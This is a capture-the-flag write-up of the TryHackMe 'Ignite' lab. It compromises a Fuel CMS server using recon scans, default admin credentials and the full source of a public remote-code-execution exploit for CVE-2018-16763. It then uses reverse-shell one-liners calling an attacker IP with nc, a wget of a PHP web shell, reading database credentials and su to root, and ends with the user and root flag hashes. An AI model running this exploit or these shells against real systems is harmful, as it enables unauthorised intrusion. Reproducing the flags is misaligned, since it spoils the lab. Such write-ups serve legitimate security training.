---
description: https://tryhackme.com/room/ignite
---

# Ignite

## INIT

```
export ignite=10.10.28.158
ping $ignite

echo "10.10.28.158 ignite.thm" >> /etc/hosts
```

## NMAP

```
nmap -sC -sV -O $ignite
```

![](<../.gitbook/assets/image (380).png>)

## GOBUSTER

```
gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](<../.gitbook/assets/image (381).png>)

## HTTP

![](<../.gitbook/assets/image (382).png>)

![](<../.gitbook/assets/image (384).png>)

![](<../.gitbook/assets/image (385).png>)

{% hint style="info" %}
login: admin

password: admin
{% endhint %}

![](<../.gitbook/assets/image (386).png>)

![](<../.gitbook/assets/image (387).png>)

```
searchsploit Fuel
searchsploit -p 47138
```

![](<../.gitbook/assets/image (388).png>)

```
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
```

```
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib
import urllib.parse

url = "http://10.10.39.95"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
        proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url, proxies=proxy)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])

```

![](<../.gitbook/assets/image (389).png>)

```
nc -e /bin/sh 10.14.4.204 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
```

![](<../.gitbook/assets/image (395).png>)

```
cmd:bash shell.sh
```

![](<../.gitbook/assets/image (396).png>)

```
python3 ignite.py
wget http://10.14.4.204:8000/phpbash.php
```

![](<../.gitbook/assets/image (391).png>)

![](<../.gitbook/assets/image (392).png>)

![](<../.gitbook/assets/image (393).png>)

![](<../.gitbook/assets/image (394).png>)

### User.txt

{% hint style="success" %}
6470e394cbf6dab6a91682cc8585059b
{% endhint %}

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](<../.gitbook/assets/image (383).png>)

```
 cat /var/www/html/fuel/application/config/database.php
```

![](<../.gitbook/assets/image (397).png>)

```
su -
password: mememe
cat /root/root.txt
```

![](<../.gitbook/assets/image (398).png>)

### Root.txt

{% hint style="success" %}
b9bbcb33e11b80be759c4e844862482d
{% endhint %}
